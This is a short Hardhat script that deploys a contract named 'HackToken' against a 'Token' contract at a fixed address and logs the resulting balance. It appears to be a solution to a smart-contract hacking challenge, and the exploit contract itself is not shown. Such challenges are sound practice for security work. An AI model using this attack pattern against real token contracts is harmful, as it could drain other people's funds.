const main = async () => {
  const [signer] = await ethers.getSigners();
  const contractFactory = await ethers.getContractFactory('HackToken');
  const contract = await contractFactory.deploy();
  let txn = await contract.transfer('0x7a0b7cB9435a54685D748DB12c7650338df3FDa5');
  txn.wait();
  const telephoneFactory = await ethers.getContractFactory('Token');
  const telephone = await telephoneFactory.attach(
    '0xa9D55A5f09346508E5C66c5D77AE93D0396a3252'
  );
  let balance = await telephone.balanceOf(
    '0x7a0b7cB9435a54685D748DB12c7650338df3FDa5'
  );
  console.log('Balance: ', Number(balance));
};

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (e) {
    console.log(e);
    process.exit(1);
  }
};
runMain();
